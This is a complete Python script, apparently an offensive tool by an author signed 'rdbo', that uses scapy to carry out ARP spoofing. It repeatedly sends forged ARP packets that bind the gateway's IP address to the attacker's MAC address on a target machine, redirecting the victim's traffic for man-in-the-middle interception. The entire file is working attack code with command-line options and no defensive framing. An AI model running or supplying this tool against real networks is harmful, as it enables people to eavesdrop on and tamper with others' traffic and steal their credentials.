from scapy.all import *
import argparse

def usage():
    print("[*] Usage:")
    print("sudo python3 arp_spoofer.py <arguments>")
    print("-t (--target):              specify target's local ip address")
    print("-m (--mac):                 attacker's mac address")
    print("-g (--gateway):             gateway's ip address (for IP forwarding)")
    print("-b (--broadcast)[optional]: network broadcast")
    print("-i (--interval)[optinal]:   interval between packets")
    print("-c (--count)[optional]:     ammount of packets to send (default 100)")

def send_packet(packet, interval : float, pcount : int):
    try:
        send(packet, inter=interval, count=pcount)
    except KeyboardInterrupt:
        print()
        print("[!] Interrupted, exiting...")
        exit(0)
    except:
        print("[!] Exception raised, exiting...")
        exit(0)

def arp_spoof(target : str, mac : str, gateway : str, broadcast : str, interval : float, pcount : int):
    print("<< arp_spoofer.py by rdbo >>")
    time.sleep(0.75)
    packet = ARP()
    packet.psrc = gateway
    packet.pdst = target
    packet.hwsrc = mac
    packet.hwdst = broadcast
    if(pcount == -1):
        while(True):
            try:
                send_packet(packet, 0, 1)
                time.sleep(interval)
            except KeyboardInterrupt:
                print()
                print("[!] Interrupted, exiting...")
                exit(0)
            except:
                print("[!] Exception raised, exiting...")
                exit(0)
    else:
        send_packet(packet, interval, pcount)
    
    exit(0)

if(__name__ == "__main__"):
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", action="store", dest="target", help="target ip", default="")
    parser.add_argument("-m", "--mac", action="store", dest="mac", help="attacker mac address", default="")
    parser.add_argument("-g", "--gateway", action="store", dest="gateway", help="gateway ip address", default="")
    parser.add_argument("-b", "--broadcast", action="store", dest="broadcast", help="broadcast", default="ff:ff:ff:ff:ff:ff")
    parser.add_argument("-i", "--interval", action="store", dest="interval", help="interval", default="0")
    parser.add_argument("-c", "--count", action="store", dest="count", help="packet count", default="-1")
    args = parser.parse_args()
    
    target = mac = gateway = broadcast = ""
    interval = count = -1
    try:
        target = str(args.target)
        mac = str(args.mac)
        gateway = str(args.gateway)
        broadcast = str(args.broadcast)
        interval = float(args.interval)
        count = float(args.count)
        if not(len(target) > 0 and len(mac) > 0 and len(gateway) > 0 and len(broadcast) > 0 and interval >= 0 and count >= -1):
            usage()
            exit(0)
    except SystemExit:
        print("[*] SystemExit")
        exit(0)
    except:
        print("[!] Unable to parse arguments")
        usage()
        exit(0)

    arp_spoof(target, mac, gateway, broadcast, interval, count)